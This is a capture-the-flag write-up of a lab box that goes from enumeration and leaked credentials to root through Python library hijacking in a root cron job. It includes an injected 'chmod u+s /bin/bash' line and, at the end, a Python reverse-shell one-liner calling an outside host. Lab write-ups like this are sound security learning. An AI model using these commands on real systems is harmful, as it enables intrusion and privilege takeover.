I started with "sudo ping -c4 10.10.226.228" to make sure I had a connection with the box.
````
PING 10.10.226.228 (10.10.226.228) 56(84) bytes of data.
64 bytes from 10.10.226.228: icmp_seq=1 ttl=63 time=53.6 ms
64 bytes from 10.10.226.228: icmp_seq=2 ttl=63 time=54.3 ms
64 bytes from 10.10.226.228: icmp_seq=3 ttl=63 time=54.1 ms
64 bytes from 10.10.226.228: icmp_seq=4 ttl=63 time=55.7 ms
````

Everything seems to be working so let's start with a basic nmap scan.
````
nmap -p- 10.10.226.228 
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 10:07 EEST
Nmap scan report for 10.10.226.228
Host is up (0.059s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
37370/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.69 seconds
````

Let's refine that a bit for more information.
````
nmap -sVC -p22,80,37370 10.10.226.228
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-30 10:08 EEST
Nmap scan report for 10.10.226.228
The host is up (0.057s latency).

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 c2:84:2a:c1:22:5a:10:f1:66:16:dd:a0:f6:04:62:95 (RSA)
|   256 42:9e:2f:f6:3e:5a:db:51:99:62:71:c4:8c:22:3e:bb (ECDSA)
|_  256 2e:a0:a5:6c:d9:83:e0:01:6c:b9:8a:60:9b:63:86:72 (ED25519)
80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
37370/tcp open  ftp     vsftpd 3.0.3
Service Info: OSs: Linux, Unix; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.37 seconds
````

So there is SSH, Apache HTTP server, and FTP server with open ports.
Let's check the webserver first as we do not have credentials for SSH or FTP.
The website seems to be for a photography company and there are pricing and gallery pages.
I used ffuf to find more directories 
````
ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.226.228/FUZZ -ic -t 70
````
Directories found were "gallery, static, pricing". I then used to find more directories with ffuf.
From the "static" directory ffuf found 18 photos and 1 extra with the name "00" which was a much smaller file than the photos.
````
dev notes from valleyDev:
-add wedding photo examples
-redo the editing on #4
-remove /dev1243224123123
-check for SIEM alerts
````

The directory found is a login page. I had ZAP running in the background to catalog everything I went to and the login page loaded "dev.js" which has a function that compares cleartext credentials.
If you log in with the credentials that the function uses for comparison it opens the "/devNotes37370.txt" file with the following:
````
dev notes for ftp server:
-stop reusing credentials
-check for any vulnerabilies
-stay up to date on patching
-change ftp port to normal port
````

As the notes hint, let's try if the plaintext credentials work for the FTP server!
`ftp 10.10.226.228 37370` with the credentials gets us in and there are three .pcapng files.
Downloaded them to my Kali and inspected them with Wireshark.
I spent a while for looking anything interesting in the TCP stream but interesting information was in HTTP requests.
There was one post request in the last file for a login page and as the protocol was not encrypted, the credentials were in plaintext.
I used the credentials to try to log in to the box with SSH and it worked!
There was `user.txt` in the valley user's home folder.

I once again spent way too long looking for ways to escalate privileges and then just tried to "su siemDev" with a password from "dev.js" and it worked.
So now I have access to `valleyDev` and `siemDev` accounts.
So there was a `valleyAuthenticator` elf binary in "/home" folder so I investigated it.
There probably is a better way to figure out what is going on in the binary but I transferred it to Kali and used `strings valleyAuthenticator`.
I got a long list of strings which I grepped for "user" and "pass*" and found some cleartext username of sorts and a password gibberish.
My eye caught a few lines above that looked like hexadecimal strings. Used crackstation.net to see if I was correct and it gave a partial match for one of the lines.
I combined two lines and it's a match! I tried the newly found password for the "valley" user and it worked.

Earlier trying to figure out privilege escalation I found a Python script that runs every minute with root privileges from "/etc/crontab".
Again I tried for a while to find a way to get the script to execute a command by editing the image files but to no avail.
What I should have done is check for what access `valleyAdmin` group that `valley` user was in. 
`/photos/script/photosEncrypt.py` script imports "base64" from "/usr/lib/python3.8" and I have write access to it as `valleyAdmin` group member. 
So I added the line `os.system("chmod u+s /bin/bash")` and as it runs as a root it edited the "bash" binary so I could spawn a privileged shell.
There was a `root.txt` in `/root` folder.

I also spent some extra time to get a reverse shell one-liner working! Here it is: 
````
import sys,socket,os,pty; s=socket.socket(); s.connect(("10.10.10.10",1234)); [os.dup2(s.fileno(),fd) for fd in (0,1,2)]; pty.spawn("/bin/bash")
````
